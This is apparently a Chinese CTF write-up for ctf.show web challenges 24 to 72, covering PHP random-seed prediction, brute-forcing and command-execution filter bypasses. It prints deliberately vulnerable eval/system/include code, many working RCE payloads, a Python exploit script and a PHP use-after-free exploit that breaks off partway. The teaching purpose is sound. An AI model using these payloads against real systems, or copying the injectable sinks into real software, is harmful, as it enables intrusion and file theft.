    if(intval($r)===intval(mt_rand())){ #intval() 函数用于获取变量的整数值
        echo $flag;
    }
}else{
    highlight_file(__FILE__);
    echo system('cat /proc/version');
}

?> Linux version 5.4.0-135-generic (buildd@lcy02-amd64-066) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 Linux version 5.4.0-135-generic (buildd@lcy02-amd64-066) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022
```

参考PHP随机数的伪随机数 mt_srand(*seed*); 函数播种 Mersenne Twister 随机数生成器。seed,可选。规定播种值
mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 **seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的**。题目已经告诉种子为`mt_srand(372619038);`，直接写一个脚本获取随机数

```php
<?php
    mt_srand(372619038);
    echo mt_rand(); #1155388967
?>
```

```
http://a207c9a3-e9b3-4849-ba4e-f3af560f40a7.challenge.ctf.show/?r=1155388967
```

##### web25

[php伪随机数漏洞 以及脚本php_mt_seed的使用教程 - 冬泳怪鸽 - 博客园 (cnblogs.com)](https://www.cnblogs.com/zaqzzz/p/9997855.html)

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:56:57
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 15:47:33
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
include("flag.php");
if(isset($_GET['r'])){
    $r = $_GET['r'];
    mt_srand(hexdec(substr(md5($flag), 0,8))); //设置随机数种子，取flag的md5值的前8位作为随机数种子
    $rand = intval($r)-intval(mt_rand()); //变量rand的值是get到的r的值减去生成的随机数
    if((!$rand)){ //这里rand的值为0才行
        if($_COOKIE['token']==(mt_rand()+mt_rand())){ //cookie的值要等于两次生成的随机数的值才输出flag
            echo $flag;
        }
    }else{
        echo $rand;
    }
}else{
    highlight_file(__FILE__);
    echo system('cat /proc/version');
}
Linux version 5.4.0-135-generic (buildd@lcy02-amd64-066) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 Linux version 5.4.0-135-generic (buildd@lcy02-amd64-066) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022
```

**需要正确的'r'&'cookie'**

种子涉及到flag，不能直接求到，if((!$rand)) 要使这个为真，就要让 $rand=0 ，而 $rand = intval($r)-intval(mt_rand()) ，所以要得到随机数才能构造 $r=$mt_rand() 。所以我们还要求得种子，这就要用到php_mt_seed来逆推种子了
下载地址：https://www.openwall.com/php_mt_seed/
先传递 r=0，可得到随机数的相反数，这里随机数为**-2074733553** (不同靶场获得的随机数不一样)

下载好工具后拉到kali里面，打开文件夹，运行终端，输入 `make`

```sh
┌──(root㉿sxylao1)-[/home/sxylao1/Study/Tools/php_mt_seed-4.0]
└─# ./php_mt_seed 2074733553 
Pattern: EXACT
Version: 3.0.7 to 5.2.0
Found 0, trying 0xfc000000 - 0xffffffff, speed 6504.4 Mseeds/s 
Version: 5.2.1+
Found 0, trying 0x62000000 - 0x63ffffff, speed 59.7 Mseeds/s 
seed = 0x62910a7f = 1653672575 (PHP 5.2.1 to 7.0.x; HHVM)
seed = 0x62910a7f = 1653672575 (PHP 7.1.0+)
Found 2, trying 0xe4000000 - 0xe5ffffff, speed 58.6 Mseeds/s 
seed = 0xe421fcab = 3827432619 (PHP 5.2.1 to 7.0.x; HHVM)
seed = 0xe421fcab = 3827432619 (PHP 7.1.0+)
Found 4, trying 0xf4000000 - 0xf5ffffff, speed 58.6 Mseeds/s 
seed = 0xf5d3b617 = 4124292631 (PHP 5.2.1 to 7.0.x; HHVM)
seed = 0xf5d3b617 = 4124292631 (PHP 7.1.0+)
Found 6, trying 0xfe000000 - 0xffffffff, speed 58.6 Mseeds/s 
Found 6
```

发现种子可能有多个，分别是1653672575、3827432619、4124292631

```php
<?php
$num = 4124292631; #1653672575、3827432619、4124292631
mt_srand($num);
echo mt_rand();
```

```php
<?php
  mt_srand(4124292631);
  mt_rand();
  echo mt_rand()+mt_rand(); #2633133112 作为cookie
?>

```

上BurpSuite抓包发送对应的**'r'&'cookie'**

```
GET /?r=2074733553 HTTP/1.1
Host: 026d2b25-f597-4396-b1de-2855f3a3df09.challenge.ctf.show
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: token=2633133112
Connection: close
```

![image-20230416193528865](.\Web-CTF\CTFshow021.png)

##### web26

点击“同意协议，开始安装”后，点击下面的按钮弹出了连接成功，抓包界面直接看见flag

![image-20230416194414077](.\Web-CTF\CTFshow022.png)

##### web27

录取名单里面有学生姓名和部分身份证号，屏蔽的信息是生日年月日，这些生日可以进行爆破

| CTFshow菜鸡学院录取名单 |        |        |                    |            |
| ----------------------- | ------ | ------ | ------------------ | ---------- |
| 序号                    | 姓名   | 专业   | 身份证号码         | 备注       |
| 1                       | 高先伊 | WEB    | 621022********5237 |            |
| 2                       | 嵇开梦 | MISC   | 360730********7653 | 党员       |
| 3                       | 郎康焕 | RE     | 522601********8092 |            |
| 4                       | 元羿谆 | PWN    | 451023********3419 | 生源地贷款 |
| 5                       | 祁落兴 | CRYPTO | 410927********5570 |            |

高先伊:621022********5237

![高先伊:621022********5237](.\Web-CTF\CTFshow023.png)

![image-20230416201630069](.\Web-CTF\CTFshow024.png)

![image-20230416201808730](.\Web-CTF\CTFshow025.png)

爆破得到生日：`19900201`，身份证为：`621022199002015237`

![image-20230416201913271](.\Web-CTF\CTFshow026.png)

得到学号为：`02015237`，直接用身份证号作为密码登录拿到flag

##### web28

```
http://58825da7-e35e-4a7a-be23-eff571f37776.challenge.ctf.show/0/1/2.txt
```

看url比较奇怪，是0/1/2.txt。如果修改最后的2.txt会被无限重定向，不删除2.txt只修改前面的0和1依旧会被无限重定向。所以，先去掉2.txt，对前面两个数字进行爆破。攻击类型选择Cluster bomb（集束炸弹）

```
xxxxxxxxxx1 1http://58825da7-e35e-4a7a-be23-eff571f37776.challenge.ctf.show/0/1/
```

![image-20230416203150985](.\Web-CTF\CTFshow027.png)

![image-20230416203251753](.\Web-CTF\CTFshow028.png)

Payload set 2位置也一样为数字类型1-100，每次一步，最后爆破出来/72/20
进入`http://58825da7-e35e-4a7a-be23-eff571f37776.challenge.ctf.show/72/20/`后取得flag

#### 命令执行

##### web29

```php
 <?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){ #过滤了flag
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

```sh
http://4a0524c8-1f8f-42c1-8386-1a9f569e645e.challenge.ctf.show/?c=echo `cat fl''ag.php`; #单引号绕过 查看源码
```

##### web30

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

```sh
http://ebc4a41b-292a-4abb-b9f2-7db5734c38e3.challenge.ctf.show/?c=echo `cat *`; #通配符绕过 查看源码
```

##### web31

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

利用POST传参，绕过过滤，`url/?c=eval($_POST[a]);&a=system("tac flag*");`

![image-20230417090734990](.\Web-CTF\CTFshow030.png)

空格的绕过可以使用 `%09 `，(tab)使用通配符来匹配文件

```sh
url/?c=echo%09`tac%09fl*`;
```

利用无参数函数

```php
url/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
```

##### web32

PHP：伪协议、文件包含、php代码的闭合

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=include$_GET["a"]?>&a=php://filter/read=convert.base64-encode/resource=flag.php #get请求 base64解码 
```

##### web33

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){ #上一题的基础上过滤了双引号
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

```sh
url/?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php #get请求 base64解码 直接不要"
```

##### web34

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){ #上题基础上过滤了冒号
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php #没影响 接着用上题的payload
```

##### web35

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c']; #相比上题过滤了 < 和 = 不过还是没有影响
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php #没影响 接着用上题的payload
```

##### web36

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php #没影响 接着用上题的payload
```

##### web37

PHP：伪协议（data://）、文件包含

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
} 
```

```php
$c = 'data://text/plain,<?php echo hello?>';
include($c);
//php中，以上代码相当于包含了 <?php echo hello?>
```

本题直接提供了一个include函数，data伪协议配合通配符绕过

```sh
url/?c=data://text/plain,<?php system('cat fl*')?>
```

或者用base64编码绕过，先对`<?php system("cat flag.php");?> `进行base64编码，再利用伪协议传输

```sh
url/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
```

##### web38

[本地考察PHP段标签绕过，点击此处进入链接](https://www.php.cn/php-weizijiaocheng-374134.html)

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
```

```sh
url/?c=data://text/plain,<?=system('tac fla?.???')?> #php代码这里可以使用php短标签进行绕过 flag.php可继续用通配符 ? 绕过
```

##### web39

```php
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=data://text/plain,<?php system('tac fl*.php')?><?php #闭合 include函数，让拼接不执行
```

```sh
url/?c=data://text/plain,<?php system('tac fl*')?> #不闭合 直接通配符绕过就行
```

因为.php 前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上

![image-20230417104625488](.\Web-CTF\CTFshow031.png)

##### web40

```php
 <?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c); #过滤了很多东西，但是下面是eval，可以直接函数执行 
        #而且其中的括号过滤是中文全角的括号，而非半角的英文括号，所以还是可以使用括号
    }
        
}else{
    highlight_file(__FILE__);
}
```

```php
url/?c=show_source(next(array_reverse(scandir(pos(localeconv()))))); #无参数函数
```

##### web41

```php
 <?php
if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
    #过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?> 
```

从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符

```php
<?php
$myfile = fopen("rce_or.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)|urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

```python
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os
os.system("php rce_or.php")  #没有将php写入环境变量需手动运行
if(len(argv)!=2):
   print("="*50)
   print('USER：python exp.py <url>')
   print("eg：  python exp.py http://ctf.show/")
   print("="*50)
   exit(0)
url=argv[1]
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("rce_or.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))
   data={
       'c':urllib.parse.unquote(param)
       }
   r=requests.post(url,data=data)
   print("\n[*] result:\n"+r.text)
```

```php
python exp.py http://d99eb662-8503-4633-895c-87b064fb0f31.challenge.ctf.show/

[+] your function：system
[+] your command：cat flag.php

[*] result:
<?php
/*
# -*- coding: utf-8 -*-
# @Author: 羽
# @Date:   2020-09-05 20:31:22
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 20:33:10
# @email: 1341963450@qq.com
# @link: https://ctf.show
*/
$flag="ctfshow{dde1d8b2-9615-4a4a-b3cf-e310f9b04e14}";
```

##### web42

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
} 
```

/dev/null  ： 在类Unix系统中，/dev/null，或称空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据（但报告写入操作成功），读取它则会立即得到一个EOF。
对于& 1 更准确的说应该是文件描述符 1,而1标识标准输出，stdout。
对于2 ，表示标准错误，stderr。
2>&1 的意思就是将标准错误重定向到标准输出。这里标准输出已经重定向到了 /dev/null。那么标准错误也会输出到/dev/null

```sh
url/?c=cat flag.php;ls #多条命令执行进行绕过 查看源码 或者直接用;号表示命令结束 后面的是下一条命令
```

##### web43

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

```sh
/?c=tac%09flag.php*%0A #url编码%0a为; 进行绕过;过滤
```

或者通过&,&&,||,|进行绕过

```sh
/?c=tac%09flag.php||ls
```

##### web44

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){ #比上题多过滤一个flag
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=tac%09fl?g.php%26%26ls #用&绕过 注意用url编码 过滤了flag用通配符搞定
```

##### web45

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){ #比上题多过滤空格 url编码空格%09绕过
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=tac%09fl?g.php%26%26ls
```

##### web46

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){ #过滤了数字和*号通配符 但是不影响之前使用的payload
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=tac%09fl?g.php%26%26ls
```

##### web47

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){ #多过滤了几条命令 没什么用
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}

```

```sh
url/?c=tac%09fl?g.php%26%26ls #= =这payload万金油了属于是
```

##### web48

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1"); #多过滤了几条命令 没什么用
    }
}else{
    highlight_file(__FILE__);
}

```

```sh
url/?c=tac%09fl?g.php%26%26ls #= =这payload万金油了属于是
```

##### web49

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1"); #多过滤了%号
    }
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=tac%09fl?g.php%26%26ls #= =这payload万金油了属于是 你过滤%号关我url编码什么事
```

##### web50

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){ #多过滤了\x09 \x26 即空格和&
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=tac<fla''g.php%0A #%0a为;的url编码 ''绕过flag过滤 <代替空格
```

##### web51

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){ #多过了几条命令
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=nl<fla''g.php%0A #完活儿了查看源码拿到flag
```

##### web52

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){ #过滤了大小于号
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}

```

```sh
url/?c=nl${IFS}fla''g.php%0A #${IFS}或者$IFS$9作为空格 进入后发现没有flag 
url/?c=pwd%0A #查看当前路径 /var/www/html/
url/?c=ls${IFS}..%0A
url/?c=ls${IFS}../../..%0A #这里发现flag 通过返回的文件夹名 确认为根目录
url/?c=nl${IFS}/fl''ag%0A #直接访问根目录
```

##### web53

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){ 
#多过滤了wget 没用
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

```sh
url/?c=nl${IFS}fla''g.php%0A
```

##### web54

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```

```sh
url/?c=/bin/?at${IFS}f???????%0A #命令路径用通配符过滤 查看一下源代码拿到
```

##### web55

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){ #没过滤空格 过滤了字母
        system($c);
    }
}else{
    highlight_file(__FILE__);
}

```

```sh
url/?c=/???/????64 ????????%0A #base64加密后解密
```

```sh
url/?c=/???/???/???2 ???.??? #bzip2是linux下面的压缩文件的命令 然后访问/flag.php.bz2进行下载获得flag.php
```

##### web56

https://blog.csdn.net/qq_46091464/article/details/108513145
无字母数字RCE,可以试试文件上传
PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        #. 没有被过滤，.(点)的用法，就是相当于source可以执行命令
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```

以以下内容建一个`Post_upload.html`的文件

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://d9805f9b-59ab-43ba-a42c-0e79969da9d2.challenge.ctf.show/" method="post" enctype="multipart/form-data">
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

创建一个`1.php`文件

```php
#!/bin/sh

ls
```

打开`Post_upload.html`网站后向目标网站POST提交`1.php`并用BurpSuite抓包

```sh
url/?c=.%20/???/????????[@-[] 
#.相当于source 可以执行文件 
#因为只有PHP生成的临时文件包含大写字母 所以[@-[]可以表示任意大写字母 在ASCII码中@<A, [>Z
```

```
POST /?c=.+/???/????????[@-[] HTTP/1.1
Host: d9805f9b-59ab-43ba-a42c-0e79969da9d2.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2
Upgrade-Insecure-Requests: 1
Content-Length: 239

-----------------------------10242300956292313528205888
Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
Content-Type: text/plain

#! /bin/sh

cat flag.php
-----------------------------10242300956292313528205888--
```

![image-20230417165321207](.\Web-CTF\CTFshow032.png)

紧接着将`ls`的命令改为`cat flag.php`再次发送即可拿到flag

##### web57

```php
 <?php
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php"); #点也过滤了 这里只要给到36就可以
    }
}else{
    highlight_file(__FILE__);
}
```

```sh
?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```

${\_} 上次命令执行的结果
$(()) 进行运算
(("")) == 0
$((~$((${\_}))))=-1

对((""))=0，对((""))取反即((((""))))为-1，37个-1相减得到-37，再取反得到36

##### web58

```php
 <?php
if(isset($_POST['c'])){
        $c= $_POST['c']; #POST传参
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

```php
c=show_source('flag.php');
c=readfile('flag.php'); #需查看源码
```

![image-20230417173528520](.\Web-CTF\CTFshow033.png)

```sh
c=highlight_file("flag.php"); #未显示时查看源码
```

##### web59

源码依旧如上，直到web66之前

```php
#注意
$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetss($a);echo $line;} //php7.3版本后 该函数已不再被使用
```

```php
//通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）
copy()
rename()
//用法：
copy("flag.php","flag.txt");             //过60
rename("flag.php","flag.txt");           //过60
```

##### web66

到本题就有问题了，一堆函数被禁掉了，首先获取文件路径

```php
c=print_r(scandir(dirname('/'))); #得到根目录信息 发现flag.txt
c=var_dump(scandir("/")); #效果与上面等同 查看根目录信息
```

```php
c=includec=include("/flag.txt"); #注意在根目录下
```

##### web67

```php
c=var_dump(scandir("/")); #var_dump没用被扳
c=include("/flag.txt"); #注意在根目录下
```

##### web68

```php
c=var_dump(scandir("/")); # highlight_file()被扳 但无关紧要
c=include("/flag.txt"); #注意在根目录下
```

##### web69

直到web70如下payload依旧可以

```php
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");} #glob://全局遍历 /*根目录下所有
#foreach(数组名 as 下标＝>值)  __toString()方法，在直接输出对象引用的时候，不会产生错误
c=$a=opendir("/"); while (($file = readdir($a)) !== false){echo $file . "<br>"; }; #这两种方法都可以读到目录
c=var_export(scandir("/"));
```

```php
c=include('/flag.txt');
c=require('/flag.txt');
c=require_once('/flag.txt');
```

##### web71

```php
<?php
error_reporting(0); #error_reporting()函数设置应该报告何种 PHP 错误 
ini_set('display_errors', 0); #为防止用户看到错误信息 不显示错误
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c); #此处执行
        $s = ob_get_contents(); #ob_start()把输出数据输出到缓冲区 ob_get_contents得到缓冲区的数据
        ob_end_clean(); #清理输出缓冲区关闭缓冲
        echo preg_replace("/[0-9]|[a-z]/i","?",$s); #执行eval之后让程序直接退出就不会被过滤掉回显信息了
}else{
    highlight_file(__FILE__);
}
?>
```

```php
c=var_export(scandir("/"));die(); 
c=include("/flag.txt");exit(0); #通过exit();使程序提前退出，绕过后面的正则表达式
c=$a=opendir('/');while(($f=readdir($a))!=false){echo $f ."<br>";};die();
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};die();
```

##### web72

代码和上一题一样，只不过多过滤了几个函数，`readir()`、`opendir()`被gank了

```php
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};die(); #flag0.txt
```

再使用uaf脚本进行命令执行，该脚本需要作为url编码后再使用

```php
c=function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() {
            global $backtrace;
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
